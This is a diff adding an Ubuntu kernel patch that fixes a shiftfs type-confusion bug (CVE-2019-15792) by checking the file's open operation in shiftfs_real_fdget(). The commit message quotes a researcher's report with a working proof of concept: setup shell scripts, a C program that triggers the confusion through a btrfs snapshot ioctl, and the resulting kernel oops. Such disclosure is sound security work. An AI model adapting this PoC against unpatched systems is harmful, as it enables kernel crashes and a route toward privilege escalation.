@@ -1,0 +1,208 @@
+From 5df147c8140efc71ac0879ae3b0057f577226d4c Mon Sep 17 00:00:00 2001
+From: Christian Brauner <christian.brauner@ubuntu.com>
+Date: Fri, 1 Nov 2019 14:19:16 +0100
+Subject: UBUNTU: SAUCE: shiftfs: prevent type confusion
+
+BugLink: https://bugs.launchpad.net/bugs/1850867
+
+Verify filesystem type in shiftfs_real_fdget().
+
+Quoting Jann Horn:
+ #################### Bug 2: Type confusion ####################
+
+ shiftfs_btrfs_ioctl_fd_replace() calls fdget(oldfd), then without further checks
+ passes the resulting file* into shiftfs_real_fdget(), which does this:
+
+ static int shiftfs_real_fdget(const struct file *file, struct fd *lowerfd)
+ {
+  struct shiftfs_file_info *file_info = file->private_data;
+  struct file *realfile = file_info->realfile;
+
+  lowerfd->flags = 0;
+  lowerfd->file = realfile;
+
+  /* Did the flags change since open? */
+  if (unlikely(file->f_flags & ~lowerfd->file->f_flags))
+   return shiftfs_change_flags(lowerfd->file, file->f_flags);
+
+  return 0;
+ }
+
+ file->private_data is a void* that points to a filesystem-dependent type; and
+ some filesystems even use it to store a type-cast number instead of a pointer.
+ The implicit cast to a "struct shiftfs_file_info *" can therefore be a bad cast.
+
+ As a PoC, here I'm causing a type confusion between struct shiftfs_file_info
+ (with ->realfile at offset 0x10) and struct mm_struct (with vmacache_seqnum at
+ offset 0x10), and I use that to cause a memory dereference somewhere around
+ 0x4242:
+
+ =======================================
+ user@ubuntu1910vm:~/shiftfs_confuse$ cat run.sh
+ #!/bin/sh
+ sync
+ unshare -mUr ./run2.sh
+ user@ubuntu1910vm:~/shiftfs_confuse$ cat run2.sh
+ #!/bin/sh
+ set -e
+
+ mkdir -p mnt/tmpfs
+ mkdir -p mnt/shiftfs
+ mount -t tmpfs none mnt/tmpfs
+ mount -t shiftfs -o mark,passthrough=2 mnt/tmpfs mnt/shiftfs
+ mount|grep shift
+ gcc -o ioctl ioctl.c -Wall
+ ./ioctl
+ user@ubuntu1910vm:~/shiftfs_confuse$ cat ioctl.c
+ #include <sys/ioctl.h>
+ #include <fcntl.h>
+ #include <err.h>
+ #include <unistd.h>
+ #include <linux/btrfs.h>
+ #include <sys/mman.h>
+
+ int main(void) {
+   // make our vmacache sequence number something like 0x4242
+   for (int i=0; i<0x4242; i++) {
+     void *x = mmap((void*)0x100000000UL, 0x1000, PROT_READ,
+         MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
+     if (x == MAP_FAILED) err(1, "mmap vmacache seqnum");
+     munmap(x, 0x1000);
+   }
+
+   int root = open("mnt/shiftfs", O_RDONLY);
+   if (root == -1) err(1, "open shiftfs root");
+   int foofd = open("/proc/self/environ", O_RDONLY);
+   if (foofd == -1) err(1, "open foofd");
+   // trigger the confusion
+   struct btrfs_ioctl_vol_args iocarg = {
+     .fd = foofd
+   };
+   ioctl(root, BTRFS_IOC_SNAP_CREATE, &iocarg);
+ }
+ user@ubuntu1910vm:~/shiftfs_confuse$ ./run.sh
+ none on /home/user/shiftfs_confuse/mnt/tmpfs type tmpfs (rw,relatime,uid=1000,gid=1000)
+ /home/user/shiftfs_confuse/mnt/tmpfs on /home/user/shiftfs_confuse/mnt/shiftfs type shiftfs (rw,relatime,mark,passthrough=2)
+ [ 348.103005] BUG: unable to handle page fault for address: 0000000000004289
+ [ 348.105060] #PF: supervisor read access in kernel mode
+ [ 348.106573] #PF: error_code(0x0000) - not-present page
+ [ 348.108102] PGD 0 P4D 0
+ [ 348.108871] Oops: 0000 [#1] SMP PTI
+ [ 348.109912] CPU: 6 PID: 2192 Comm: ioctl Not tainted 5.3.0-19-generic #20-Ubuntu
+ [ 348.112109] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.12.0-1 04/01/2014
+ [ 348.114460] RIP: 0010:shiftfs_real_ioctl+0x22e/0x410 [shiftfs]
+ [ 348.116166] Code: 38 44 89 ff e8 43 91 01 d3 49 89 c0 49 83 e0 fc 0f 84 ce 01 00 00 49 8b 90 c8 00 00 00 41 8b 70 40 48 8b 4a 10 89 c2 83 e2 01 <8b> 79 40 48 89 4d b8 89 f8 f7 d0 85 f0 0f 85 e8 00 00 00 85 d2 75
+ [ 348.121578] RSP: 0018:ffffb1e7806ebdc8 EFLAGS: 00010246
+ [ 348.123097] RAX: ffff9ce6302ebcc0 RBX: ffff9ce6302e90c0 RCX: 0000000000004249
+ [ 348.125174] RDX: 0000000000000000 RSI: 0000000000008000 RDI: 0000000000000004
+ [ 348.127222] RBP: ffffb1e7806ebe30 R08: ffff9ce6302ebcc0 R09: 0000000000001150
+ [ 348.129288] R10: ffff9ce63680e840 R11: 0000000080010d00 R12: 0000000050009401
+ [ 348.131358] R13: 00007ffd87558310 R14: ffff9ce60cffca88 R15: 0000000000000004
+ [ 348.133421] FS: 00007f77fa842540(0000) GS:ffff9ce637b80000(0000) knlGS:0000000000000000
+ [ 348.135753] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+ [ 348.137413] CR2: 0000000000004289 CR3: 000000026ff94001 CR4: 0000000000360ee0
+ [ 348.139451] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+ [ 348.141516] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+ [ 348.143545] Call Trace:
+ [ 348.144272] shiftfs_ioctl+0x65/0x76 [shiftfs]
+ [ 348.145562] do_vfs_ioctl+0x407/0x670
+ [ 348.146620] ? putname+0x4a/0x50
+ [ 348.147556] ksys_ioctl+0x67/0x90
+ [ 348.148514] __x64_sys_ioctl+0x1a/0x20
+ [ 348.149593] do_syscall_64+0x5a/0x130
+ [ 348.150658] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+ [ 348.152108] RIP: 0033:0x7f77fa76767b
+ [ 348.153140] Code: 0f 1e fa 48 8b 05 15 28 0d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 0f 1f 44 00 00 f3 0f 1e fa b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d e5 27 0d 00 f7 d8 64 89 01 48
+ [ 348.158466] RSP: 002b:00007ffd875582e8 EFLAGS: 00000217 ORIG_RAX: 0000000000000010
+ [ 348.160610] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f77fa76767b
+ [ 348.162644] RDX: 00007ffd87558310 RSI: 0000000050009401 RDI: 0000000000000003
+ [ 348.164680] RBP: 00007ffd87559320 R08: 00000000ffffffff R09: 0000000000000000
+ [ 348.167456] R10: 0000000000000000 R11: 0000000000000217 R12: 0000561c135ee100
+ [ 348.169530] R13: 00007ffd87559400 R14: 0000000000000000 R15: 0000000000000000
+ [ 348.171573] Modules linked in: shiftfs intel_rapl_msr intel_rapl_common kvm_intel kvm snd_hda_codec_generic irqbypass ledtrig_audio crct10dif_pclmul crc32_pclmul snd_hda_intel snd_hda_codec ghash_clmulni_intel snd_hda_core snd_hwdep aesni_intel aes_x86_64 snd_pcm crypto_simd cryptd glue_helper snd_seq_midi joydev snd_seq_midi_event snd_rawmidi snd_seq input_leds snd_seq_device snd_timer serio_raw qxl snd ttm drm_kms_helper mac_hid soundcore drm fb_sys_fops syscopyarea sysfillrect qemu_fw_cfg sysimgblt sch_fq_codel parport_pc ppdev lp parport virtio_rng ip_tables x_tables autofs4 hid_generic usbhid hid psmouse i2c_i801 ahci virtio_net lpc_ich libahci net_failover failover virtio_blk
+ [ 348.188617] CR2: 0000000000004289
+ [ 348.189586] ---[ end trace dad859a1db86d660 ]---
+ [ 348.190916] RIP: 0010:shiftfs_real_ioctl+0x22e/0x410 [shiftfs]
+ [ 348.193401] Code: 38 44 89 ff e8 43 91 01 d3 49 89 c0 49 83 e0 fc 0f 84 ce 01 00 00 49 8b 90 c8 00 00 00 41 8b 70 40 48 8b 4a 10 89 c2 83 e2 01 <8b> 79 40 48 89 4d b8 89 f8 f7 d0 85 f0 0f 85 e8 00 00 00 85 d2 75
+ [ 348.198713] RSP: 0018:ffffb1e7806ebdc8 EFLAGS: 00010246
+ [ 348.200226] RAX: ffff9ce6302ebcc0 RBX: ffff9ce6302e90c0 RCX: 0000000000004249
+ [ 348.202257] RDX: 0000000000000000 RSI: 0000000000008000 RDI: 0000000000000004
+ [ 348.204294] RBP: ffffb1e7806ebe30 R08: ffff9ce6302ebcc0 R09: 0000000000001150
+ [ 348.206324] R10: ffff9ce63680e840 R11: 0000000080010d00 R12: 0000000050009401
+ [ 348.208362] R13: 00007ffd87558310 R14: ffff9ce60cffca88 R15: 0000000000000004
+ [ 348.210395] FS: 00007f77fa842540(0000) GS:ffff9ce637b80000(0000) knlGS:0000000000000000
+ [ 348.212710] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+ [ 348.214365] CR2: 0000000000004289 CR3: 000000026ff94001 CR4: 0000000000360ee0
+ [ 348.216409] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+ [ 348.218349] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+ Killed
+ user@ubuntu1910vm:~/shiftfs_confuse$
+
+Reported-by: Jann Horn <jannh@google.com>
+Signed-off-by: Christian Brauner <christian.brauner@ubuntu.com>
+[ saf: use f_op->open instead as special inodes in shiftfs sbs
+  will not use shiftfs open f_ops ]
+Signed-off-by: Seth Forshee <seth.forshee@canonical.com>
+
+CVE-2019-15792
+
+Acked-by: Tyler Hicks <tyhicks@canonical.com>
+Signed-off-by: Stefan Bader <stefan.bader@canonical.com>
+---
+ fs/shiftfs.c | 33 +++++++++++++++++++--------------
+ 1 file changed, 19 insertions(+), 14 deletions(-)
+
+diff --git a/fs/shiftfs.c b/fs/shiftfs.c
+index 60576e9..0132287 100644
+--- a/fs/shiftfs.c
++++ b/fs/shiftfs.c
+@@ -1087,20 +1087,6 @@ static int shiftfs_change_flags(struct file *file, unsigned int flags)
+ 	return 0;
+ }
+ 
+-static int shiftfs_real_fdget(const struct file *file, struct fd *lowerfd)
+-{
+-	struct file *realfile = file->private_data;
+-
+-	lowerfd->flags = 0;
+-	lowerfd->file = realfile;
+-
+-	/* Did the flags change since open? */
+-	if (unlikely(file->f_flags & ~lowerfd->file->f_flags))
+-		return shiftfs_change_flags(lowerfd->file, file->f_flags);
+-
+-	return 0;
+-}
+-
+ static int shiftfs_open(struct inode *inode, struct file *file)
+ {
+ 	struct file *realfile;
+@@ -1187,6 +1173,25 @@ static rwf_t shiftfs_iocb_to_rwf(struct kiocb *iocb)
+ 	return flags;
+ }
+ 
++static int shiftfs_real_fdget(const struct file *file, struct fd *lowerfd)
++{
++	struct file *realfile;
++
++	if (file->f_op->open != shiftfs_open &&
++	    file->f_op->open != shiftfs_dir_open)
++		return -EINVAL;
++
++	realfile = file->private_data;
++	lowerfd->flags = 0;
++	lowerfd->file = realfile;
++
++	/* Did the flags change since open? */
++	if (unlikely(file->f_flags & ~lowerfd->file->f_flags))
++		return shiftfs_change_flags(lowerfd->file, file->f_flags);
++
++	return 0;
++}
++
+ static ssize_t shiftfs_read_iter(struct kiocb *iocb, struct iov_iter *iter)
+ {
+ 	struct file *file = iocb->ki_filp;
+-- 
+cgit v1.1
+
